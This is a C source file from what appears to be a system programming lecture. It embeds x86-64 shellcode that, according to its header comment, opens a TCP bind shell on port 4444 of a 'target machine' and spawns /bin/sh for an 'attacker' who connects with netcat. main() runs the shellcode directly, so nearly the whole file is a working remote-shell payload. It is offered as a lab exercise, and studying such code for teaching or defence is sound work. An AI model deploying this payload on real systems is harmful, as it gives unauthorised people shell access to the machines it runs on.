/*
*  Video Lecture: 39
*  Instructor: Arif Butt
*  Course: System Programming with Linux
*  shell_bind_tcp.c: This program creates a tcp bind shell
*  Once executed on the target machine will open up a communication
*  port and waits for incoming connections. The attacker when tries
*  to connect to the victim machine, this program duplicate the 
*  standard descriptors and spawns a shell
*  Compile: gcc shell_bind_tcp.c -o shell_bind_tcp
*  Run the program on kali machine with ip 192.168.100.21
*  usage: $ ./shell_bind_tcp 
*  Connect from Ubuntuserver with following command
*  # nc 192.168.100.21 -p 4444
*/
#include <stdio.h>
#include <string.h>

char * code = \
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
"\x97\x52\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a"
"\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48"
"\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48"
"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99"
"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89"
"\xe7\x52\x57\x48\x89\xe6\x0f\x05";

int main(){
   printf("Length of Shellcode is %d bytes\n", strlen(code));
   int (*foo)() = (int(*)())code;
   foo();
   return 0;
}
